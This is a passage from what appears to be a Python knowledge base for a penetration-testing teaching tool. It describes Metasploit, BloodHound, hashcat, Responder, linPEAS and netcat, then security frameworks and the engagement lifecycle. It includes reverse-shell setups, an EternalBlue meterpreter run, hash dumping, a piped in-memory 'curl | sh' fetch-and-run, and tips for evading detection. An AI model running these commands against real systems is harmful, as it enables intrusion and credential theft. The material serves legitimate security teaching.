            "ffuf":           "The binary.",
            "-u .../FUZZ":    "TARGET URL with the FUZZ keyword marking the INJECTION POINT. The word 'FUZZ' is replaced by each wordlist entry — it can sit in the path, a param, or a header.",
            "FUZZ":           "The placeholder. YOU position it wherever you want to fuzz (path vs ?param=FUZZ vs Host: FUZZ).",
            "-w /usr/share/seclists/...": "WORDLIST. SOURCE: SecLists (the standard) or Kali's dirb lists. Match the list to the goal — Web-Content for dirs, DNS lists for vhosts.",
            "-mc 200,301,302": "MATCH these status codes (your signal filter). Pair with -fc/-fs to hide noise.",
        },
    },

    "metasploit": {
        "summary": "Exploitation framework — 2000+ modules covering exploit, post, auxiliary",
        "typical": "msfconsole -q",
        "flags": {
            "search":       "search ms17-010 — find modules by CVE, name, or platform",
            "use":          "use exploit/windows/smb/ms17_010_eternalblue",
            "info":         "info — show module description, options, and targets",
            "show options": "show required and optional parameters",
            "set RHOSTS":   "Target IP: set RHOSTS 192.168.1.100",
            "set LHOST":    "Your IP for reverse shell: set LHOST 192.168.1.50",
            "set LPORT":    "Listening port: set LPORT 4444",
            "set PAYLOAD":  "Payload: set PAYLOAD windows/x64/meterpreter/reverse_tcp",
            "run / exploit":"Execute the module",
            "sessions":     "List active Meterpreter sessions",
            "sessions -i 1":"Interact with session 1",
            "background":   "Background current session (Ctrl+Z)",
            "getsystem":    "Attempt privilege escalation to SYSTEM",
            "hashdump":     "Dump password hashes from SAM",
            "run post/":    "Post-exploitation modules: run post/multi/recon/local_exploit_suggester",
        },
        "read": [
            "Meterpreter session opened = successful exploit — you have a shell",
            "No session created = exploit failed — check RHOSTS, LHOST, and payload",
            "PAYLOAD => shows what shell will be sent — reverse_tcp = target calls back to you",
            "Migration moves your shell into a stable process (migrate to explorer.exe)",
            "Always set LHOST to your actual reachable IP, not localhost",
        ],
        "next": ["hashdump", "getsystem", "run post/multi/recon/local_exploit_suggester", "persistence"],
        "caution": "Exploits can crash services and systems. Test on snapshots. Log every action.",
        "cia": [
            "CONFIDENTIALITY — primary. A meterpreter session reads any data the compromised account can reach.",
            "INTEGRITY — primary. Code execution = full ability to modify files, configs, and other systems from the beachhead.",
            "AVAILABILITY — real risk. Memory-corruption exploits can crash the target service or whole box. Test on snapshots; know the exploit's reliability rating.",
        ],
        "anatomy_cmd": "use exploit/...; set RHOSTS <target>; set LHOST <you>; set PAYLOAD ...; run",
        "anatomy": {
            "use exploit/...": "MODULE — chosen from 'search <CVE>'. SOURCE: a CVE that nmap/nuclei/searchsploit flagged for the target's exact version.",
            "RHOSTS":         "REMOTE host = the TARGET. SOURCE: nmap. The victim you're exploiting.",
            "LHOST":           "LOCAL host = YOUR attacker IP the reverse shell calls back to. SOURCE: 'ip a' (eth0/tun0). Beginners' #1 mistake: setting this to localhost instead of their reachable IP.",
            "LPORT":           "Port your handler listens on — YOUR choice (443/53 blend with normal egress).",
            "PAYLOAD":         "What runs on success. reverse_tcp = victim calls YOU (works through NAT); bind = you call the victim. Match arch (x64) to the target.",
        },
    },

    "bloodhound": {
        "summary": "Active Directory attack path mapper — visualizes paths to Domain Admin",
        "typical": "bloodhound-python -u user -p pass -d domain.local -c All --zip",
        "flags": {
            "-u":       "Domain username",
            "-p":       "Password",
            "-d":       "Domain name: domain.local",
            "-c All":   "Collect everything (Users, Groups, Sessions, ACLs, Trusts)",
            "--zip":    "Create zip for BloodHound import",
            "--dns-tcp":"Use TCP for DNS (if UDP fails)",
            "-ns":      "Name server (DC IP): -ns 192.168.1.10",
        },
        "read": [
            "Shortest path to Domain Admins = the attack path you want",
            "GenericAll/GenericWrite = full control over that object — huge privilege",
            "WriteDACL = can modify permissions — abuse to grant yourself GenericAll",
            "DCSync = right to pull all password hashes from the DC",
            "Kerberoastable accounts = extract their hashes offline without admin",
        ],
        "next": ["impacket-GetUserSPNs (Kerberoast)", "impacket-secretsdump (DCSync)", "mimikatz (local hashes)"],
        "caution": "SharpHound on-domain is noisier than bloodhound-python off-domain.",
        "cia": [
            "CONFIDENTIALITY — primary. Maps who-can-reach-what across AD, exposing the privilege relationships that guard sensitive data.",
            "INTEGRITY — high. The attack PATHS it reveals (WriteDACL, GenericAll) are exactly the rights to modify objects and escalate.",
            "AVAILABILITY — low. Collection is LDAP queries (read-only); the noise risk is detection, not disruption. -c DCOnly is the quietest.",
        ],
        "anatomy_cmd": "bloodhound-python -u user -p pass -d domain.local -ns <DC-IP> -c All",
        "anatomy": {
            "bloodhound-python": "The collector (off-domain, runs from YOUR box — leaves no agent on the target).",
            "-u user -p pass":"DOMAIN CREDENTIALS. SOURCE: any valid creds you already obtained — responder→crack, password spray hit, or provided for the engagement. BloodHound needs at least one foothold account.",
            "-d domain.local":"DOMAIN NAME. SOURCE: enum4linux, the DC's LDAP, or nmap's hostname output.",
            "-ns <DC-IP>":    "NAME SERVER = the Domain Controller's IP. SOURCE: nmap (the host with 88/389/445 open is usually the DC).",
            "-c All":         "Collection method. 'All' is thorough but louder; '-c DCOnly' queries just the DC and is the stealthiest.",
        },
    },

    "hashcat": {
        "summary": "GPU-accelerated password hash cracker — fastest on the planet",
        "typical": "hashcat -m 1000 -a 0 hashes.txt ~/.err0rs/wordlists/rockyou.txt",
        "flags": {
            "-m":       "Hash type: 1000=NTLM, 0=MD5, 1800=SHA512crypt, 13100=Kerberoast, 22000=WPA2",
            "-a":       "Attack mode: 0=dictionary, 3=brute force, 6=hybrid wordlist+mask",
            "-r":       "Rules file: -r /usr/share/hashcat/rules/best64.rule",
            "--show":   "Show cracked hashes from previous session",
            "--session": "Name session to resume: --session mysession",
            "-o":       "Output cracked to file: -o cracked.txt",
            "--potfile-disable": "Don't use potfile (start fresh)",
            "?u":       "Mask: uppercase letter",
            "?l":       "Mask: lowercase letter",
            "?d":       "Mask: digit",
            "?s":       "Mask: special character",
        },
        "read": [
            "Recovered = cracked — check hashcat --show for the plaintext",
            "Exhausted = wordlist finished with no crack — try rules or different wordlist",
            "Speed (H/s) shows how fast — GPU >>> CPU for this",
            "Status: Running = working, ETA shows estimated finish",
            "Use -a 0 -r rules/best64.rule before brute force — catches 80% faster",
        ],
        "next": ["test cracked password against target", "credential stuffing (same pass other services)"],
        "caution": "Without a GPU, hashcat is very slow. Use john the ripper as CPU alternative.",
        "cia": [
            "CONFIDENTIALITY — primary. Cracking a hash recovers the plaintext password, unlocking whatever that credential protects.",
            "INTEGRITY — secondary. The recovered credential typically grants write access too, enabling data tampering downstream.",
            "AVAILABILITY — none. Hashcat is 100% offline — it never touches the target. That's the OPSEC beauty: zero target-side noise, zero lockout risk.",
        ],
        "anatomy_cmd": "hashcat -m 1000 -a 0 hashes.txt rockyou.txt",
        "anatomy": {
            "hashcat":        "The binary.",
            "-m 1000":        "HASH TYPE (mode). 1000 = NTLM. SOURCE: you identify it from WHERE the hash came — secretsdump→NTLM(1000), /etc/shadow→sha512crypt(1800), responder→NetNTLMv2(5600), WPA capture→22000. Wrong -m = it can't crack.",
            "-a 0":           "ATTACK MODE. 0 = straight dictionary. Your strategy choice (0/3/6).",
            "hashes.txt":     "THE HASHES to crack. SOURCE: sqlmap dump, impacket-secretsdump, responder capture, a leaked DB, or john-formatted /etc/shadow. One hash per line.",
            "rockyou.txt":    "WORDLIST of guesses. SOURCE: rockyou (gunzip /usr/share/wordlists/rockyou.txt.gz first), SecLists, or a custom cewl list.",
        },
    },

    "responder": {
        "summary": "LLMNR/NBT-NS poisoner — captures NTLM hashes on the local network",
        "typical": "responder -I eth0 -wF",
        "flags": {
            "-I":   "Interface: -I eth0",
            "-w":   "Enable WPAD rogue proxy server",
            "-F":   "Force NTLM authentication in WPAD responses",
            "-r":   "Enable rogue DNS",
            "-d":   "Enable DHCP replies",
            "-A":   "Analyze mode (don't poison — just observe)",
            "--lm": "Downgrade to LM hashes (older Windows)",
        },
        "read": [
            "[*] = informational event",
            "[+] Poisoned answer = machine asked for something, you replied — they'll send hashes",
            "Hash captured! shows the NTLMv2 hash — crack it with hashcat -m 5600",
            "NTLMv2 is strong but crackable with rockyou if password is weak",
            "Username and client IP tell you who the hash belongs to",
        ],
        "next": ["hashcat -m 5600 (crack NTLMv2)", "ntlmrelayx (relay instead of cracking)", "crackmapexec"],
        "caution": "LLMNR poisoning will disrupt legitimate network traffic. LAN attacks only with permission.",
        "cia": [
            "CONFIDENTIALITY — primary. Capturing NTLMv2 hashes off the wire harvests credentials that protect data across the whole domain.",
            "INTEGRITY — high (via relay). With ntlmrelayx those captured auths can be relayed to modify systems, not just read.",
            "AVAILABILITY — caution. Poisoning answers to LLMNR/NBT-NS broadcasts disrupts legitimate name resolution on the LAN — you can break things for real users.",
        ],
        "anatomy_cmd": "responder -I eth0 -wF",
        "anatomy": {
            "responder":      "The binary.",
            "-I eth0":        "INTERFACE to listen/poison on. SOURCE: 'ip a' or 'ifconfig' — pick the NIC on the target LAN segment (eth0, wlan0, etc.). Wrong interface = you hear nothing.",
            "-w":             "Enable the WPAD rogue proxy — your choice, increases catch rate.",
            "-F":             "Force NTLM auth in WPAD responses — your choice. Combined as -wF.",
            "(no target)":    "NOTE: responder has NO target argument — it's PASSIVE-ish, answering broadcasts that victims send on their own. You position on the segment; the victims come to you.",
        },
    },

    "linpeas": {
        "summary": "Linux privilege escalation auditor — finds every path to root",
        "typical": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "flags": {
            "-a":   "All checks (more thorough, noisier)",
            "-s":   "Silent (less output — only critical findings)",
            "-q":   "Quick scan",
            "-o":   "Output to file",
        },
        "read": [
            "Red/Yellow highlight = critical finding — check this first",
            "SUID binaries = programs that run as root — check GTFOBins.github.io for exploits",
            "Writable paths in PATH = can hijack commands run by root scripts",
            "Sudo -l output = what you can run as sudo — huge if (ALL) NOPASSWD",
            "Interesting files in /etc = check /etc/passwd for hashes, /etc/shadow if readable",
        ],
        "next": ["gtfobins exploit (SUID)", "sudo exploitation", "CVE search (found kernel version)"],
        "caution": "LinPEAS creates lots of log entries — assume your presence is being recorded.",
        "cia": [
            "CONFIDENTIALITY — secondary. It reads config/files to FIND privesc paths; the data exposure is the payoff after you escalate.",
            "INTEGRITY — primary goal. The whole point is finding a path to root, i.e. the power to modify ANYTHING on the box.",
            "AVAILABILITY — none directly. It's a read-only enumeration script; it doesn't change or break the system itself.",
        ],
        "anatomy_cmd": "curl -L https://.../linpeas.sh | sh",
        "anatomy": {
            "curl -L ...":    "FETCH the script over the network. SOURCE: the PEASS-ng GitHub releases URL. -L follows redirects.",
            "| sh":           "PIPE straight into the shell so it runs IN MEMORY — no file written to disk (quieter, leaves less forensic trace).",
            "(runs locally)": "PREREQUISITE: you must ALREADY have a shell on the target (from a reverse shell, SSH, etc.). linpeas runs ON the victim, enumerating from the inside — it has no 'target' argument.",
            "alt: ./linpeas.sh": "If no internet on the box, you transfer the .sh file first (scp/nc/python http.server) then run it.",
        },
    },

    "netcat": {
        "summary": "TCP/UDP Swiss army knife — listeners, port checks, file transfer, pivoting",
        "typical": "nc -lvnp 4444   # listen for reverse shell",
        "flags": {
            "-l":   "Listen mode",
            "-v":   "Verbose",
            "-n":   "No DNS resolution (faster)",
            "-p":   "Port: -p 4444",
            "-e":   "Execute program on connect: -e /bin/bash (some nc versions)",
            "-u":   "UDP mode",
            "-z":   "Port scan mode: nc -z target 80-443",
            "-w":   "Connection timeout: -w 3",
        },
        "read": [
            "Listening on [0.0.0.0] 4444 = ready for reverse shell",
            "connect to [...] = connection received — you have a shell",
            "$ or # prompt = shell working — # means root",
            "No response from -z scan = port closed",
        ],
        "next": ["python pty (upgrade shell)", "socat (encrypted shell)", "chisel (tunneling)"],
        "caution": "nc shells are fragile and unencrypted. Upgrade to a pty immediately.",
        "cia": [
            "CONFIDENTIALITY — secondary. The shell/transfer it provides is the channel through which data is read or exfiltrated.",
            "INTEGRITY — primary. A reverse shell is interactive control of the target — full ability to modify the system.",
            "AVAILABILITY — low. netcat itself moves bytes; it doesn't degrade service (though what you DO with the shell might).",
        ],
        "anatomy_cmd": "nc -lvnp 4444",
        "anatomy": {
            "nc":             "The binary (netcat).",
            "-l":             "LISTEN mode — you're the server waiting for the victim to connect back (a reverse shell).",
            "-v -n":          "Verbose + no-DNS. Your convenience flags.",
            "-p 4444":        "LISTEN PORT — YOUR choice, but it must MATCH the port baked into the payload/reverse-shell one-liner you ran on the victim. Pick 443/53 to blend with normal egress.",
            "(your IP)":      "IMPLICIT: the victim's reverse-shell command points at YOUR attacker IP:port. SOURCE of that IP: 'ip a' on your box, or the tun0 IP on a VPN/HTB.",
        },
    },

    # ══════════════════════════════════════════════════════════════
    # CONCEPTS — CIS CONTROLS
    # ══════════════════════════════════════════════════════════════

    "cis": {
        "summary": "CIS Controls v8 — 18 controls that block 85% of common attacks",
        "typical": "Implement in order: Controls 1-6 first (IG1), then expand",
        "flags": {
            "CIS 1":   "Inventory of Enterprise Assets — know what's on your network",
            "CIS 2":   "Inventory of Software Assets — know what's running",
            "CIS 3":   "Data Protection — classify and protect sensitive data",
            "CIS 4":   "Secure Config — harden everything to CIS Benchmarks",
            "CIS 5":   "Account Management — control who has accounts and access",
            "CIS 6":   "Access Control — enforce least privilege",
            "CIS 7":   "Continuous Vulnerability Management — patch within 30 days",
            "CIS 8":   "Audit Log Management — log everything, retain 90+ days",
            "CIS 9":   "Email/Web Browser Protections — SPF/DKIM/DMARC, web filtering",
            "CIS 10":  "Malware Defenses — AV/EDR with behavior detection",
            "CIS 11":  "Data Recovery — encrypted backups, test restoration",
            "CIS 12":  "Network Infrastructure Management — firewall rules, segmentation",
            "CIS 13":  "Network Monitoring — IDS/IPS, NetFlow analysis",
            "CIS 14":  "Security Awareness Training — phishing sims, annual training",
            "CIS 15":  "Service Provider Management — vendor risk assessments",
            "CIS 16":  "Application Security — SDLC, SAST/DAST, dependency scanning",
            "CIS 17":  "Incident Response — IR plan, tabletop exercises",
            "CIS 18":  "Penetration Testing — annual tests, remediation tracking",
        },
        "read": [
            "IG1 (Controls 1-6) = essential hygiene — any org should have these",
            "IG2 (Controls 1-9) = security-mature orgs — medium risk tolerance",
            "IG3 (All 18) = high-risk environments — finance, healthcare, government",
            "Controls 1 and 2 are foundational — you can't protect what you don't know exists",
            "CIS 7 (patch management) blocks the most breaches in practice",
        ],
        "next": ["CIS Benchmarks (system hardening)", "NIST CSF (framework mapping)", "compliance report"],
        "caution": "CIS Controls are a starting point, not a guarantee. Threat model your specific environment.",
        "cia": [
            "ALL THREE — CIS is a defensive program covering the whole triad: CIS 3 (Data Protection) = Confidentiality, CIS 8 (Audit Logs) + CIS 11 (Recovery) = Integrity/Availability.",
            "As an attacker, CIS tells you which pillar the defender invested in — gaps in their lowest-numbered missing control are your easiest path.",
        ],
        "apply": [
            "Pre-engagement: ask the client which Implementation Group (IG1/2/3) they target. That one answer tells you their maturity instantly.",
            "Map every finding you report to a specific CIS Control number — boards and risk officers understand 'violates CIS 5 (Account Management)'.",
            "If they're CIS-aligned, assume Audit Logs (CIS 8) are on — favor quieter techniques and expect your actions to be recorded.",
            "Read the CIS Benchmark for the target OS/app BEFORE testing — it's the blue team's hardening checklist, so it shows you exactly what they likely did and didn't lock down.",
            "Use missing low-number controls as your attack priority: no asset inventory (CIS 1-2) means shadow IT; no patch mgmt (CIS 7) means old CVEs work.",
        ],
    },

    "owasp": {
        "summary": "OWASP Top 10 2021 — the 10 most critical web application security risks",
        "typical": "Map every finding to an OWASP category for your report",
        "flags": {
            "A01 Broken Access Control":     "Most critical — users accessing other users' data",
            "A02 Cryptographic Failures":    "Sensitive data in cleartext, weak ciphers, no TLS",
            "A03 Injection":                 "SQLi, OS command injection, LDAP injection, XPath",
            "A04 Insecure Design":           "Missing threat models, no security requirements",
            "A05 Security Misconfiguration": "Default creds, cloud misconfigs, verbose errors",
            "A06 Vulnerable Components":     "Outdated libraries with known CVEs",
            "A07 Auth Failures":             "Weak passwords, no MFA, credential stuffing",
            "A08 Software Integrity":        "Unsigned code, no SCA, supply chain attacks",
            "A09 Logging Failures":          "No audit logs, not alerting on attacks",
            "A10 SSRF":                      "Server fetches attacker-controlled URLs",
        },
        "read": [
            "A01 Broken Access Control causes the most real breaches — test EVERY endpoint",
            "A03 Injection (SQLi) is still everywhere despite being 30 years old",
            "A05 Misconfigs are easy wins for attackers and easy fixes for defenders",
            "A07 Auth Failures = almost always weak or reused passwords",
            "SSRF (A10) can reach internal APIs and cloud metadata endpoints (169.254.169.254)",
        ],
        "next": ["burp suite (manual web testing)", "nuclei owasp templates", "zap (automated scan)"],
        "caution": "OWASP is web-focused. Don't forget network, physical, and social engineering risks.",
        "cia": [
            "MAPS ACROSS THE TRIAD — each category hits a pillar: A01 Broken Access Control + A02 Crypto Failures = Confidentiality; A03 Injection + A08 Integrity Failures = Integrity; A05/A06 misconfig & old components can yield DoS = Availability.",
            "Naming the pillar a web finding breaks is how you set its severity in the report.",
        ],
        "apply": [
            "Use the Top 10 as a web-test CHECKLIST — walk each category against every endpoint so nothing gets skipped.",
            "Tag every web finding with its OWASP ID (e.g. 'A03:2021 Injection') — it's the lingua franca clients and other testers expect.",
            "Prioritize A01 (Broken Access Control) first — it causes the most real breaches; test IDOR by changing IDs/usernames in every request.",
            "For A05 Misconfiguration, check default creds, verbose error pages, and exposed admin panels — fastest wins on most engagements.",
            "Drive the test order from what whatweb/nuclei fingerprinted: old component → A06; login form → A07; URL fetch param → A10 SSRF (try 169.254.169.254).",
        ],
    },

    "mitre": {
        "summary": "MITRE ATT&CK — structured knowledge base of attacker TTPs (Tactics, Techniques, Procedures)",
        "typical": "Map every attack technique you use to an ATT&CK ID for your report",
        "flags": {
            "TA0043 Reconnaissance":    "OSINT, port scanning, phishing for info",
            "TA0042 Resource Dev":      "Setting up infrastructure, malware, credentials",
            "TA0001 Initial Access":    "Phishing, exploit public-facing app, valid accounts",
            "TA0002 Execution":         "Running code: PowerShell, cmd, WMI, scripts",
            "TA0003 Persistence":       "Maintaining access: registry run keys, scheduled tasks, backdoors",
            "TA0004 Priv Escalation":   "Becoming SYSTEM/root: SUID, sudo, token impersonation",
            "TA0005 Defense Evasion":   "Hiding: obfuscation, AMSI bypass, log clearing",
            "TA0006 Credential Access": "Dumping: Mimikatz, SAM, LSASS, Kerberoasting",
            "TA0007 Discovery":         "Mapping the network: nmap, BloodHound, net commands",
            "TA0008 Lateral Movement":  "Moving host to host: Pass-the-Hash, RDP, PsExec",
            "TA0009 Collection":        "Staging data to exfiltrate",
            "TA0010 Exfiltration":      "Getting data out: DNS, HTTPS, cloud storage",
            "TA0011 C2":               "Command and Control: Cobalt Strike, Empire, Metasploit",
            "TA0040 Impact":           "Ransomware, data destruction, defacement",
        },
        "read": [
            "Every technique has sub-techniques — be specific in reports (T1059.001 = PowerShell)",
            "Use ATT&CK Navigator to map your engagement visually (free web tool)",
            "Mitigations section shows exactly what defenses block each technique",
            "Detections section shows what logs to collect to catch the technique",
            "Defenders use ATT&CK to find gaps — red teamers use it to find bypasses",
        ],
        "next": ["ATT&CK Navigator (visualization)", "MITRE D3FEND (defensive mapping)", "reporting"],
        "caution": "ATT&CK describes observed behaviors, not a complete list. Novel techniques won't be in it.",
        "cia": [
            "SPANS THE TRIAD by tactic — Collection/Exfiltration (TA0009/0010) attack Confidentiality; Defense Evasion + Impact-via-tampering attack Integrity; the Impact tactic (TA0040: ransomware, destruction) attacks Availability.",
            "ATT&CK is the shared map between red and blue: you use it to pick techniques, they use it to build detections.",
        ],
        "apply": [
            "Log the ATT&CK technique ID for every action you take during the engagement (e.g. T1110 for your hydra spray) — your report then maps 1:1 to a framework the client already tracks.",
            "Open ATT&CK Navigator (free web tool) and color the techniques you used — instant visual coverage map for the report.",
            "Before going loud, read the Detection section of the technique you're about to use — it tells you which logs will catch you, so you can choose a quieter sub-technique.",
            "Use the Mitigations section in reverse: a control they're missing = a technique that will work.",
            "Be specific with sub-techniques in findings: 'T1059.001 PowerShell', not just 'T1059 Execution' — precision is what separates a pro report from a student one.",
        ],
    },

    "kill-chain": {
        "summary": "Cyber Kill Chain — 7 phases of every targeted attack (Lockheed Martin)",
        "typical": "Map your pentest phases to Kill Chain stages for professional reporting",
        "flags": {
            "1 Reconnaissance":  "OSINT, shodan, LinkedIn — learning about the target",
            "2 Weaponization":   "Building payloads, exploits, phishing emails",
            "3 Delivery":        "Getting the payload to the target: email, USB, exploit",
            "4 Exploitation":    "Triggering the vulnerability — code runs on target",
            "5 Installation":    "Persistence — making sure you stay after reboot",
            "6 C2":             "Establishing command and control channel",
            "7 Actions on Obj": "The actual goal: data theft, ransomware, espionage",
        },
        "read": [
            "Breaking the chain at ANY phase = attack failed (defenders use this model)",
            "Delivery is the most commonly defended phase — email filters, web proxies",
            "Most orgs are weakest at Exploitation and Installation phases",
            "Defenders aim to detect by phase 3 at the latest — phase 6 is too late",
            "Every phase leaves artifacts — logs, process spawns, network connections",
        ],
        "next": ["MITRE ATT&CK (more granular TTPs)", "diamond model (threat intel)", "IR planning"],
        "caution": "Kill Chain is linear — real attacks aren't. Use ATT&CK for non-linear mapping.",
        "cia": [
            "The chain is the ROUTE to a CIA breach — phase 7 (Actions on Objectives) is where the triad is actually hit (steal data = C, alter/ransom = I, destroy/DoS = A).",
            "Phases 1-6 don't break the triad themselves; they're the setup. That's why defenders try to break the chain EARLY, before phase 7.",
        ],
        "apply": [
            "Structure your engagement narrative by these 7 phases in the report — execs grasp 'we got to phase 6 undetected' instantly.",
            "For each phase you completed, note what artifact you left (recon = log entries, delivery = email, installation = persistence mechanism) so the blue team knows where to look.",
            "Identify which phase the defender is weakest at — most orgs defend Delivery (email/web filters) well but are blind at Exploitation and Installation.",
            "Use it as a STOP-test: if you can show the chain breaks at an early phase (e.g. delivery blocked), that's a defensive win worth reporting, not a failure.",
            "When the linear model doesn't fit (lateral movement, loops), switch to MITRE ATT&CK for the granular mapping and reference the kill chain only for the exec summary.",
        ],
    },

    "cia": {
        "summary": "CIA Triad — Confidentiality, Integrity, Availability — the foundation of security",
        "typical": "Frame every security decision around: does this protect C, I, or A?",
        "flags": {
            "Confidentiality": "Only authorized parties can access data (encryption, access controls)",
            "Integrity":       "Data hasn't been tampered with (hashing, digital signatures, audit logs)",
            "Availability":    "Systems are accessible when needed (redundancy, backups, DDoS mitigation)",
        },
        "read": [
            "Most attacks target Confidentiality (data theft) or Availability (ransomware, DDoS)",
            "Integrity attacks are sneakiest — you don't know your data was changed",
            "Security controls often trade against each other: more auth = less availability",
            "Pentests test Confidentiality and Integrity primarily",
            "CIA Triad maps to NIST CSF: Protect=C/I, Detect/Respond=all, Recover=A",
        ],
        "next": ["risk assessment", "threat modeling", "control mapping to framework"],
        "caution": "Some add a 4th: Non-repudiation (can't deny you did something). Check your scope.",
        "cia": [
            "THIS IS the triad — every other lesson's CIA section maps back here. Confidentiality = secrecy, Integrity = trustworthiness, Availability = uptime.",
            "Every vulnerability you ever find breaks at least one of these three. Naming which one is the first step of writing the finding.",
        ],
        "apply": [
            "For EVERY finding, write one sentence: 'This breaks ___ because ___.' (e.g. 'breaks Confidentiality because it dumps the user table'). That sentence becomes your impact statement.",
            "Use the triad to set severity: a Confidentiality leak of public data is low; an Integrity break on financial records is critical. Same bug class, different pillar weight.",
            "Translate to business language for execs: Confidentiality = 'data breach / lawsuit', Integrity = 'fraud / bad data', Availability = 'downtime / lost revenue'. That's what funds the fix.",
            "Watch the trade-offs in your recommendations — adding MFA strengthens C but can hurt A (lockouts). Note the balance so your advice is realistic.",
            "Apply it to your OWN engagement data too: are your notes encrypted (C), tamper-evident (I), and backed up (A)? You're a custodian of the client's secrets.",
        ],
    },

    "incident-response": {
        "summary": "IR Phases (NIST SP 800-61) — Preparation, Detection, Containment, Eradication, Recovery, Lessons Learned",
        "typical": "Run a tabletop exercise annually covering all 6 phases for your top 3 threat scenarios",
        "flags": {
            "Phase 1 Preparation":    "IR plan, contact lists, runbooks, SIEM configured, EDR deployed",
            "Phase 2 Detection":      "Alert fires — is this a true positive? Triage and classify severity",
            "Phase 3 Containment":    "Stop the bleeding — isolate affected systems without destroying evidence",
            "Phase 4 Eradication":    "Remove the attacker — delete malware, close backdoors, patch the vuln",
            "Phase 5 Recovery":       "Restore from clean backups, verify integrity, monitor closely",
            "Phase 6 Lessons Learned":"Post-incident report — what happened, timeline, gaps, improvements",
        },
        "read": [
            "Containment before eradication — make sure you've found everything first",
            "Preserve evidence before wiping — disk image, memory dump, log collection",
            "Notify stakeholders early — legal, PR, and execs need time to prepare",
            "Treat phase 6 as critical — same vulnerability hitting you twice = embarrassing",
            "Chain of custody matters if legal action is possible — document everything",
        ],
        "next": ["forensics (memory/disk imaging)", "threat hunting (find lateral movement)", "lessons learned report"],
        "caution": "Never eradicate before you have full scope — attacker may have 10 more backdoors.",
        "cia": [
            "IR exists to RESTORE the triad after a breach — Containment stops further Confidentiality loss, Eradication+Recovery rebuild Integrity and Availability.",
            "As a red-teamer, understanding IR tells you the defender's reaction timeline — how fast they'll move from Detection to Containment once they spot you.",
        ],
        "apply": [
            "Know the playbook you're up against: when you trip an alert, the SOC moves Detection → Containment fast. Plan your actions assuming a clock starts the moment you're noticed.",
            "Phase 3 (Containment) is host isolation — if you have multiple footholds, expect them to be cut one at a time. Persistence across several hosts buys you survival time (and tests their thoroughness).",
            "Test their Detection (phase 2) deliberately: do a noisy action and see if anyone responds. 'No detection in 48h' is a critical finding about their blue-team gap.",
            "In purple-team mode, walk each phase WITH the defenders — show them exactly what your activity looked like in their logs so they tune Detection.",
            "In your report, recommend tabletop exercises for the top scenarios you proved viable — that's the constructive, blue-team-helping close to an engagement.",
        ],
    },

    "threat-modeling": {
        "summary": "Structured process to identify what can go wrong before you build or test",
        "typical": "STRIDE model: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege",
        "flags": {
            "Spoofing":              "Can an attacker fake identity? (phishing, ARP spoofing, JWT forgery)",
            "Tampering":             "Can data be modified? (MITM, SQLi, file write)",
            "Repudiation":           "Can actions be denied? (no logs, log deletion)",
            "Information Disclosure":"Can private data be exposed? (verbose errors, IDOR, SQLi)",
            "Denial of Service":     "Can the system be made unavailable? (DDoS, resource exhaustion)",
            "Elevation of Privilege":"Can low-priv become high-priv? (SUID, sudo misconfig, token theft)",
        },
        "read": [
            "Start with data flow diagrams — follow data from user to storage and back",
            "Trust boundaries are where attacks happen — draw them explicitly",
            "STRIDE maps perfectly to MITRE ATT&CK techniques",
            "Threat model before you build — not after the breach",
            "PASTA and VAST are more advanced models for mature security programs",
        ],
        "next": ["risk register", "penetration test scoping", "security requirements in SDLC"],
        "caution": "Threat models go stale — update when architecture changes significantly.",
        "cia": [
            "STRIDE maps directly onto the triad: Info Disclosure = Confidentiality; Tampering + Spoofing + Repudiation = Integrity; Denial of Service = Availability; Elevation of Privilege = the master key to all three.",
            "Threat modeling is how you decide WHICH pillar to attack (or defend) first for a given system.",
        ],
        "apply": [
            "Start every engagement by sketching a data-flow diagram of the target — follow data from user → app → storage and back. Attacks live at the arrows.",
            "Draw the trust boundaries explicitly (internet↔DMZ, app↔DB, user↔admin). Each boundary crossing is a place to test STRIDE.",
            "Walk each component through all six STRIDE letters as a prompt: 'Can I spoof this? Tamper with it? ...' — it generates your test cases systematically.",
            "Map each STRIDE threat you identify to a concrete tool: Spoofing→responder/JWT forge, Tampering→sqlmap/Burp, Info Disclosure→ffuf/nikto, EoP→linpeas. The model tells you what to run.",
            "Do it BEFORE you start testing — a 20-minute threat model focuses the whole engagement and stops you from random unfocused scanning.",
        ],
    },

    # ════════════════════════════════════════════════════════════════════
    #  ENGAGEMENT THEORY — the full lifecycle, beginning to end
    #  These teach the METHODOLOGY a professional follows, not a tool.
    #  Ordered: lifecycle → scoping → target-id → recon-theory → reporting
    # ════════════════════════════════════════════════════════════════════
    "engagement-lifecycle": {
        "summary": "The 7 phases of a professional security engagement, start to finish",
        "typical": "Pre-Engagement → Recon → Scanning/Enum → Exploitation → Post-Ex → Reporting → Remediation Retest",
        "flags": {
            "1. Pre-Engagement":   "Scope, rules of engagement, authorization, contracts. NO testing happens yet.",
            "2. Reconnaissance":   "OSINT + footprinting. Mostly passive. Build the target picture before touching it.",
            "3. Scanning/Enum":    "Active discovery — ports, services, versions, users, shares. First noisy phase.",
            "4. Exploitation":     "Turn a vulnerability into access. Where detection risk spikes.",
            "5. Post-Exploitation":"Privesc, lateral movement, persistence, data access. Prove business impact.",
            "6. Reporting":        "The actual deliverable. Findings, evidence, risk ratings, remediation steps.",
            "7. Remediation Retest":"Verify the client fixed what you found. Closes the loop.",
        },
        "read": [
            "Most beginners rush to phase 4 — pros spend the most time in 1, 2, and 6",
            "The report is what the client PAYS for — the hacking is just how you fill it",
            "Each phase feeds the next: recon scopes scanning, scanning scopes exploitation",
            "You can loop back — post-ex findings often trigger more recon on newly-found hosts",
            "PTES and the OSSTMM are the formal methodology standards worth reading",
        ],
        "next": ["scoping", "target-identification", "recon-theory", "reporting"],
        "caution": "Skipping phase 1 (authorization) isn't a methodology shortcut — it's a federal crime (CFAA).",
        "cia": [
            "The lifecycle is HOW you safely probe a client's CIA posture — phases 3-5 test whether their Confidentiality, Integrity, and Availability actually hold under attack.",
            "Phase 1 (authorization) is itself an Integrity control on YOU — it's the signed record that your actions are sanctioned, not criminal.",
        ],
        "apply": [
            "Treat the phases as a checklist gate — do not advance to Exploitation (4) until Recon (2) and Scanning (3) have actually scoped the target. Rushing skips findings.",
            "Budget your time like a pro: most of it goes to phases 1, 2, and 6 (scoping, recon, reporting) — not the 'hacking'. Beginners invert this and produce thin reports.",
            "Let each phase feed the next concretely: recon output (subfinder/theHarvester) becomes scanning input (nmap), scanning output becomes exploitation targets.",
